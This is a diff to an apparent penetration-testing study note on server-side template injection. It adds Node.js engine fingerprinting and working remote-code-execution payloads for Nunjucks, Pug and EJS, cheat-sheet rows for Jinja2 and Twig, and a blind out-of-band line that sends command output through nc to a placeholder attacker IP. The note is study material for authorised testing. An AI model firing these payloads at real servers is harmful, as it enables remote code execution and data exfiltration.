@@ -1,6 +1,6 @@
 # Server-Side Attacks
 
-#SSRF #SSTI #SSI #XSLT #MassAssignment #OpenRedirect #ServerSide #WebAppAttacks #RCE #LFI #InjectionAttacks
+#SSRF #SSTI #SSI #XSLT #MassAssignment #OpenRedirect #ServerSide #WebAppAttacks #RCE #LFI #InjectionAttacks #NodeJS #Nunjucks #Handlebars
 
 ## What is this?
 
@@ -229,15 +229,23 @@ ${{<%[%'"}}%\.
 ```mermaid
 flowchart TD
     P["Inject {{7*7}}"] --> Q{"Renders as 49?"}
-    Q -->|"No"| F["Try ${7*7}"]
-    F --> G{"Renders as 49?"}
-    G -->|"Yes"| FM["Freemarker / Mako"]
-    G -->|"No"| NV["Not SSTI / unknown"]
+    Q -->|"No"| F["Try the other delimiters:<br/>${7*7} · #{7*7} · &lt;%= 7*7 %&gt;"]
+    F --> G{"Which one renders 49?"}
+    G -->|"dollar-brace"| FM["Freemarker / Mako"]
+    G -->|"hash-brace"| PUG["Pug (Node)"]
+    G -->|"angle-percent"| EJS["EJS / Underscore (Node)<br/>or ERB (Ruby)"]
+    G -->|"none, but this reflects"| HB["Handlebars / Mustache<br/>(logic-less: no arithmetic)"]
+    G -->|"nothing at all"| NV["Not SSTI"]
     Q -->|"Yes"| R["Inject {{7*'7'}}"]
-    R --> S{"Distinguish"}
+    R --> S{"Result"}
     S -->|"7777777"| Jinja["Jinja2 (Python)"]
-    S -->|"49"| Twig["Twig (PHP)"]
+    S -->|"49"| AMB["Twig (PHP) OR Nunjucks (Node)"]
+    AMB --> T{"Does the range global resolve?"}
+    T -->|"Yes"| NUN["Nunjucks (Node)"]
+    T -->|"No"| TW["Twig (PHP)"]
 ```
+
+> [!warning] **Two traps in the classic `{{7*7}}` → `{{7*'7'}}` tree.** (1) `7*'7'` is **49 in both Twig and Nunjucks** — PHP and JS both coerce the string to a number, while only Python repeats it. So a `49` does *not* mean Twig; it means "PHP or Node," and sending Nunjucks down a PHP gadget path wastes the engagement. Discriminate with `{{range}}`, a Nunjucks-only global. (2) **Handlebars and Mustache are logic-less** — they evaluate no arithmetic at all, so `{{7*7}}` renders empty and looks exactly like "not vulnerable." Probe those with `{{this}}` / `{{self}}` instead: reflection confirms a mustache-family engine even though no expression ever evaluates.
 
 > [!tip]
 > Test everywhere the value ends up rendered, not just URL/form params — headers (`User-Agent`, `Referer`), cookies, and JSON body fields all get run through the same template engine in plenty of apps.
@@ -301,6 +309,48 @@ $ex.waitFor()
 
 > [!note] No `{{ }}`/`${ }` and the confirm probes fail? Try **`<%= %>`** (ERB/Ruby) and **`{ }`** (Smarty) — the two syntaxes the fingerprint tree above doesn't branch to.
 
+### Node.js Engines (Nunjucks, Pug, EJS, Handlebars)
+
+Node is one of the most common stacks and had no path through the tree above. Delimiters first — these decide which probe even fires (from PayloadsAllTheThings' JavaScript SSTI reference):
+
+| Engine | Delimiter | Evaluates expressions? |
+|---|---|---|
+| Nunjucks, TwigJS, HoganJS, VueJS | `{{ }}` | **Yes** — Nunjucks is the Jinja2-alike and the usual win |
+| Handlebars, MustacheJS | `{{ }}` | **No** — logic-less; `{{7*7}}` renders empty |
+| EJS, UnderscoreJS | `<% %>` | Yes (`<%= 7*7 %>`) |
+| Pug | `#{ }` | Yes (`#{7*7}`) |
+| DotJS, Lodash | `{{= }}` | Yes |
+| DustJS | `{ }` | Yes |
+
+Once you know the delimiter, the payload is the same everywhere — Node hands you `child_process` through `process.mainModule`. Wrap this in whichever tag the engine uses:
+
+```javascript
+global.process.mainModule.require("child_process").execSync("id").toString()
+```
+
+```bash
+# Nunjucks — no direct global access, so pivot through a constructor
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+
+# Pug — the universal payload in #{ }, or multi-line unbuffered code
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+
+# EJS / Underscore
+<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
+```
+
+```javascript
+// Blind / no output? Same three shapes as the rest of the note:
+// time-based
+global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
+// out-of-band
+global.process.mainModule.require("child_process").execSync("id | nc <ATTACKER_IP> 9001").toString()
+```
+
+> [!warning] **Handlebars RCE is version-bound, unlike the others.** The well-known `{{#with "s" as |string|}}…` chain was fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6) and only lands on `< 3.0.7`, `>= 4.0.0 < 4.0.14`, or `>= 4.1.0 < 4.1.2`. On a patched Handlebars, template injection is still an information-disclosure/template-logic issue but **not** an RCE — check the version before promising a shell in a report.
+
+> [!note] `<%= %>` is shared by **EJS/Underscore (Node)** and **ERB (Ruby)** — see the **Smarty & ERB** section above. Tell them apart by what resolves: `<%= 7*7 %>` works in both, but `<%= global.process %>` only answers on Node, and `<%= RUBY_VERSION %>` only on Ruby.
+
 ### SSTImap (Automation)
 
 ```bash
@@ -313,7 +363,7 @@ python3 sstimap.py -u "http://<TARGET_IP>/index.php?name=test" --os-shell       
 ```
 
 > [!tip]
-> For the remaining engines (Thymeleaf, Mako, Handlebars/Pug, etc.), the identification/exploitation logic is the same — only the syntax changes. Check the PayloadsAllTheThings SSTI cheat sheet for the specific engine's RCE gadget.
+> For the remaining engines (Thymeleaf, Dust, Hogan, etc.), the identification/exploitation logic is the same — only the syntax changes. Check the PayloadsAllTheThings SSTI cheat sheet for the specific engine's RCE gadget.
 
 ---
 
@@ -586,7 +636,13 @@ What you're up against per class, and where each control still leaks — useful 
 | SSRF LFI | `url=file:///etc/passwd` |
 | SSRF → forged POST | `gopher://host:port/_POST%20...` (double URL-encode the whole thing) |
 | SSTI polyglot probe | `${{<%[%'"}}%\.` |
-| SSTI engine fingerprint | `{{7*7}}` → `{{7*'7'}}` (Jinja2: `7777777`, Twig: `49`) |
+| SSTI engine fingerprint | `{{7*7}}` → `{{7*'7'}}` (Jinja2: `7777777`; **`49` = Twig *or* Nunjucks**) |
+| Split Twig vs Nunjucks | `{{range}}` resolves on Nunjucks (Node) only |
+| Logic-less engine check | `{{7*7}}` empty but `{{this}}` reflects → Handlebars / Mustache |
+| Node SSTI universal RCE | `global.process.mainModule.require("child_process").execSync("id").toString()` |
+| Nunjucks RCE | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` |
+| Pug RCE | `#{root.process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout}` |
+| EJS RCE | `<%= global.process.mainModule.require("child_process").execSync("id").toString() %>` |
 | SSTI test surface | not just params — headers, cookies, JSON body fields |
 | Jinja2 RCE | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` |
 | Twig RCE | `{{ ['id'] \| filter('system') }}` |
@@ -606,5 +662,5 @@ What you're up against per class, and where each control still leaks — useful 
 ---
 
 *Created: 2026-07-14*
-*Updated: 2026-09-01*
+*Updated: 2026-09-22*
 *Model: claude-opus-5*
